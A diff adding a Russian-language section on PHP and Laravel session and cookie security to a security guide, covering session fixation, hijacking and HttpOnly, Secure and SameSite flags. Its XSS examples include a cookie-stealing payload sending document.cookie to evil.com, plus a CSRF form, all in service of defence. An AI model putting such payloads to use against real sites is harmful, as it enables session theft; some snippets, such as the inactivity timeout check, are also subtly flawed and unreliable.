@@ -944,7 +944,521 @@ if ($result['status'] === 'FOUND') {
 
 ---
 
-## 🎓 Laravel Security Checklist
+## � Sessions & Cookies Security
+
+### Sessions (Сессии)
+
+**Session** - механизм для хранения данных пользователя между HTTP запросами.
+
+#### Базовая работа
+
+```php
+// Старт сессии
+session_start();
+
+// Запись данных
+$_SESSION['user_id'] = 123;
+$_SESSION['username'] = 'john';
+
+// Чтение данных
+$userId = $_SESSION['user_id'] ?? null;
+
+// Удаление конкретного ключа
+unset($_SESSION['user_id']);
+
+// Полное уничтожение сессии
+session_destroy();
+
+// Регенерация ID (важно для безопасности!)
+session_regenerate_id(true);
+```
+
+#### Session Handlers (хранилища)
+
+**По умолчанию:** файлы на диске (`/tmp` или `session.save_path`)
+
+```php
+// php.ini
+session.save_handler = files
+session.save_path = "/var/lib/php/sessions"
+```
+
+**Database Handler** (для кластеров):
+
+```php
+// Laravel автоматически использует database/redis handler
+// config/session.php
+'driver' => env('SESSION_DRIVER', 'database'),
+```
+
+**Redis Handler** (рекомендуется для production):
+
+```php
+// config/session.php
+'driver' => 'redis',
+'connection' => 'session',
+
+// .env
+SESSION_DRIVER=redis
+REDIS_HOST=127.0.0.1
+```
+
+**Custom Handler:**
+
+```php
+class DatabaseSessionHandler implements SessionHandlerInterface
+{
+    public function open($savePath, $sessionName): bool
+    {
+        return true;
+    }
+    
+    public function close(): bool
+    {
+        return true;
+    }
+    
+    public function read($id): string
+    {
+        $session = DB::table('sessions')->where('id', $id)->first();
+        return $session ? $session->data : '';
+    }
+    
+    public function write($id, $data): bool
+    {
+        DB::table('sessions')->updateOrInsert(
+            ['id' => $id],
+            [
+                'data' => $data,
+                'last_activity' => time(),
+            ]
+        );
+        return true;
+    }
+    
+    public function destroy($id): bool
+    {
+        DB::table('sessions')->where('id', $id)->delete();
+        return true;
+    }
+    
+    public function gc($lifetime): int
+    {
+        $expired = time() - $lifetime;
+        return DB::table('sessions')
+            ->where('last_activity', '<', $expired)
+            ->delete();
+    }
+}
+
+// Регистрация
+session_set_save_handler(new DatabaseSessionHandler(), true);
+session_start();
+```
+
+#### Session Security Threats
+
+**1. Session Hijacking (перехват сессии):**
+
+```php
+// ❌ Уязвимость: передача session ID в URL
+https://example.com/page?PHPSESSID=abc123
+
+// ✅ Решение: только в cookies
+ini_set('session.use_only_cookies', 1);
+ini_set('session.use_trans_sid', 0);  // Отключить передачу в URL
+```
+
+**2. Session Fixation (фиксация сессии):**
+
+```php
+// ❌ Атака
+// 1. Злоумышленник создает сессию: PHPSESSID=malicious123
+// 2. Передает жертве: https://site.com/?PHPSESSID=malicious123
+// 3. Жертва логинится → её данные в известной сессии
+// 4. Злоумышленник использует PHPSESSID=malicious123 → доступ!
+
+// ✅ Защита: регенерация ID после login
+session_start();
+
+if ($user->login($email, $password)) {
+    // Создать новый session ID, удалить старый
+    session_regenerate_id(true);
+    $_SESSION['user_id'] = $user->id;
+}
+
+// Laravel делает это автоматически при login:
+Auth::attempt($credentials);  // регенерирует session ID
+```
+
+**3. Session Cookie Theft (кража cookie через XSS):**
+
+```php
+// ✅ HttpOnly flag - недоступно для JavaScript
+ini_set('session.cookie_httponly', 1);
+
+// Cookie не доступна через document.cookie
+// XSS-скрипт не сможет её украсть
+```
+
+**4. Man-in-the-Middle (перехват через HTTP):**
+
+```php
+// ✅ Secure flag - только по HTTPS
+ini_set('session.cookie_secure', 1);
+
+// Cookie передается только по HTTPS, не по HTTP
+```
+
+**5. CSRF (Cross-Site Request Forgery):**
+
+```php
+// ✅ SameSite cookie attribute
+ini_set('session.cookie_samesite', 'Lax');  // или 'Strict'
+
+// Cookie не отправляется при cross-site запросах
+```
+
+#### Полная конфигурация для production
+
+**php.ini:**
+
+```ini
+; Session ID в cookies, не в URL
+session.use_only_cookies = 1
+session.use_trans_sid = 0
+
+; Secure cookies (только HTTPS)
+session.cookie_secure = 1
+
+; HttpOnly (защита от XSS)
+session.cookie_httponly = 1
+
+; SameSite (защита от CSRF)
+session.cookie_samesite = "Lax"
+
+; Время жизни сессии
+session.gc_maxlifetime = 1440  ; 24 минуты
+session.cookie_lifetime = 0    ; До закрытия браузера
+
+; Имя cookie (изменить дефолтное PHPSESSID)
+session.name = "APP_SESSION"
+
+; Путь к хранилищу
+session.save_handler = redis
+session.save_path = "tcp://127.0.0.1:6379"
+
+; Энтропия для генерации session ID (по умолчанию достаточно)
+session.sid_length = 48
+session.sid_bits_per_character = 6
+```
+
+**Laravel config/session.php:**
+
+```php
+return [
+    'driver' => env('SESSION_DRIVER', 'redis'),
+    'lifetime' => env('SESSION_LIFETIME', 120),  // минуты
+    'expire_on_close' => false,
+    'encrypt' => true,  // Шифрование данных сессии
+    'files' => storage_path('framework/sessions'),
+    'connection' => env('SESSION_CONNECTION', null),
+    'table' => 'sessions',
+    'store' => env('SESSION_STORE', null),
+    'lottery' => [2, 100],  // 2% шанс запуска garbage collection
+    'cookie' => env('SESSION_COOKIE', Str::slug(env('APP_NAME', 'laravel'), '_').'_session'),
+    'path' => '/',
+    'domain' => env('SESSION_DOMAIN', null),
+    'secure' => env('SESSION_SECURE_COOKIE', true),  // Только HTTPS
+    'http_only' => true,  // HttpOnly flag
+    'same_site' => 'lax',  // SameSite attribute
+];
+```
+
+#### Best Practices
+
+```php
+// ✅ Регенерация ID после критичных действий
+public function login(Request $request)
+{
+    if (Auth::attempt($credentials)) {
+        $request->session()->regenerate();  // Новый session ID
+        return redirect('/dashboard');
+    }
+}
+
+// ✅ Хранение метаданных для проверки
+session_start();
+
+if (!isset($_SESSION['initialized'])) {
+    $_SESSION['initialized'] = true;
+    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
+    $_SESSION['ip_address'] = $_SERVER['REMOTE_ADDR'];
+}
+
+// Проверка на hijacking
+if ($_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
+    session_destroy();
+    die('Session hijacking detected!');
+}
+
+// ✅ Timeout для неактивности
+$_SESSION['last_activity'] = time();
+
+if (time() - $_SESSION['last_activity'] > 1800) {
+    session_unset();
+    session_destroy();
+    header('Location: /login?timeout=1');
+    exit;
+}
+
+// ✅ Разные сессии для admin
+if ($user->isAdmin()) {
+    ini_set('session.cookie_name', 'ADMIN_SESSION');
+    session_start();
+}
+```
+
+---
+
+### Cookies Security
+
+**Cookie** - небольшой файл, хранящийся в браузере пользователя.
+
+#### Базовая работа
+
+```php
+// Установка cookie
+setcookie('username', 'john', [
+    'expires' => time() + 3600,  // 1 час
+    'path' => '/',
+    'domain' => '.example.com',
+    'secure' => true,      // Только HTTPS
+    'httponly' => true,    // Недоступно для JS
+    'samesite' => 'Lax',   // CSRF защита
+]);
+
+// Чтение cookie
+$username = $_COOKIE['username'] ?? null;
+
+// Удаление cookie (установить expires в прошлом)
+setcookie('username', '', [
+    'expires' => time() - 3600,
+    'path' => '/',
+]);
+```
+
+#### Cookie Attributes для безопасности
+
+**1. Secure flag** - только HTTPS:
+
+```php
+setcookie('token', $value, [
+    'secure' => true,  // ✅ Cookie передается только по HTTPS
+]);
+
+// ❌ Без Secure - может быть перехвачена по HTTP
+setcookie('token', $value);
+```
+
+**2. HttpOnly flag** - защита от XSS:
+
+```php
+setcookie('session_token', $value, [
+    'httponly' => true,  // ✅ Недоступна через JavaScript
+]);
+
+// ❌ Без HttpOnly - доступна через document.cookie
+// XSS-скрипт может украсть: fetch('https://evil.com?c=' + document.cookie)
+```
+
+**3. SameSite attribute** - защита от CSRF:
+
+```php
+// Strict - cookie НЕ отправляется при переходе с другого сайта
+setcookie('admin_token', $value, [
+    'samesite' => 'Strict',
+]);
+// Использовать для критичных cookies (admin панель)
+
+// Lax - cookie отправляется только при GET с другого сайта
+setcookie('user_session', $value, [
+    'samesite' => 'Lax',  // ✅ Рекомендуется по умолчанию
+]);
+// Login cookie, обычные сессии
+
+// None - cookie отправляется всегда (требует Secure)
+setcookie('tracking', $value, [
+    'samesite' => 'None',
+    'secure' => true,  // Обязательно с SameSite=None
+]);
+// Для iframe, cross-site интеграций
+```
+
+**Разница SameSite:**
+
+```php
+// Пользователь на evil.com нажимает ссылку на yourapp.com
+
+// SameSite=Strict: cookie НЕ отправится → пользователь не залогинен
+// SameSite=Lax: cookie отправится → пользователь залогинен ✅
+// SameSite=None: cookie отправится всегда
+
+// Пользователь на evil.com, JS делает POST на yourapp.com/delete
+
+// SameSite=Strict: cookie НЕ отправится → CSRF защита ✅
+// SameSite=Lax: cookie НЕ отправится → CSRF защита ✅
+// SameSite=None: cookie отправится → CSRF возможен ❌
+```
+
+**4. Domain и Path:**
+
+```php
+// Доступна на example.com и всех поддоменах
+setcookie('token', $value, [
+    'domain' => '.example.com',  // ✅ api.example.com, www.example.com
+]);
+
+// Доступна только на example.com
+setcookie('token', $value, [
+    'domain' => 'example.com',  // ❌ НЕ работает на api.example.com
+]);
+
+// Доступна только на /admin/*
+setcookie('admin_token', $value, [
+    'path' => '/admin',
+]);
+```
+
+#### Cookie Prefixes (дополнительная безопасность)
+
+```php
+// __Secure- prefix: обязателен Secure flag
+setcookie('__Secure-token', $value, [
+    'secure' => true,  // Обязательно!
+]);
+
+// __Host- prefix: Secure + Path=/ + без Domain
+setcookie('__Host-token', $value, [
+    'secure' => true,
+    'path' => '/',
+    // domain НЕ устанавливается (только текущий хост)
+]);
+```
+
+#### Защита от атак
+
+**1. Cookie Theft через XSS:**
+
+```php
+// ❌ Уязвимость
+echo "Hello, " . $_GET['name'];  // XSS!
+// Атака: ?name=<script>fetch('https://evil.com?c='+document.cookie)</script>
+
+// ✅ Защита 1: HttpOnly cookie
+setcookie('session', $value, ['httponly' => true]);
+// Cookie недоступна для JavaScript
+
+// ✅ Защита 2: Экранирование output
+echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES);
+```
+
+**2. CSRF через Cookie:**
+
+```php
+// ❌ Уязвимость: форма на evil.com отправляет POST на yourapp.com
+<form action="https://yourapp.com/delete-account" method="POST">
+    <button>Click me!</button>
+</form>
+// Cookie отправится автоматически → аккаунт удален!
+
+// ✅ Защита 1: SameSite cookie
+setcookie('session', $value, ['samesite' => 'Lax']);
+
+// ✅ Защита 2: CSRF token (см. раздел CSRF выше)
+```
+
+**3. Man-in-the-Middle:**
+
+```php
+// ❌ Cookie передается по HTTP → может быть перехвачена
+setcookie('session', $value);
+
+// ✅ Только HTTPS
+setcookie('session', $value, ['secure' => true]);
+
+// ✅ + HSTS header
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+```
+
+#### Laravel Cookie Helpers
+
+```php
+// Установка cookie
+return response('Hello')
+    ->cookie('name', 'value', $minutes);
+
+// С параметрами
+return response('Hello')
+    ->cookie('name', 'value', $minutes, $path, $domain, $secure, $httpOnly, false, $sameSite);
+
+// Cookie facade
+use Illuminate\Support\Facades\Cookie;
+
+Cookie::queue('name', 'value', $minutes);
+
+// Чтение
+$value = Cookie::get('name');
+$value = $request->cookie('name');
+
+// Удаление
+Cookie::queue(Cookie::forget('name'));
+
+// Encrypted cookies (Laravel по умолчанию шифрует все cookies)
+// app/Http/Middleware/EncryptCookies.php
+protected $except = [
+    'unencrypted_cookie',  // Исключения из шифрования
+];
+```
+
+#### Best Practices
+
+```php
+// ✅ Полная безопасная cookie
+setcookie('session_token', $value, [
+    'expires' => time() + 3600,
+    'path' => '/',
+    'domain' => '',  // Только текущий хост
+    'secure' => true,      // Только HTTPS
+    'httponly' => true,    // Защита от XSS
+    'samesite' => 'Lax',   // Защита от CSRF
+]);
+
+// ✅ Не храни чувствительные данные в cookies
+// ❌ Плохо
+setcookie('credit_card', '1234-5678-9012-3456');
+
+// ✅ Хорошо: храни только session ID
+setcookie('session_id', $randomToken);
+// Данные в БД/Redis по session_id
+
+// ✅ Используй подписанные cookies для integrity
+// Laravel делает автоматически
+$value = Cookie::get('signed_cookie');  // Проверяет подпись
+
+// ✅ Короткое время жизни для критичных cookies
+setcookie('admin_token', $value, [
+    'expires' => time() + 300,  // 5 минут
+]);
+
+// ✅ Разные cookies для разных уровней доступа
+setcookie('user_session', $userToken, ['samesite' => 'Lax']);
+setcookie('admin_session', $adminToken, ['samesite' => 'Strict']);
+```
+
+---
+
+## �🎓 Laravel Security Checklist
 
 ### ✅ Обязательные меры
 
@@ -987,5 +1501,7 @@ protected $middleware = [
 8. **Laravel Gates/Policies** - для authorization
 9. **Rate limiting** - против brute force
 10. **Security headers** - X-Frame-Options, CSP, X-Content-Type-Options
+11. **Session security** - session_regenerate_id() после login, HttpOnly/Secure/SameSite flags, session handlers (Redis для production)
+12. **Cookie security** - Secure (только HTTPS), HttpOnly (защита от XSS), SameSite (Lax/Strict для CSRF защиты)
 
-**Главное:** Defense in depth (многоуровневая защита), assume breach (предполагай взлом), least privilege (минимальные привилегии).
+**Главное:** Defense in depth (многоуровневая защита), assume breach (предполагай взлом), least privilege (минимальные привилегии), всегда используй Secure+HttpOnly+SameSite для cookies.
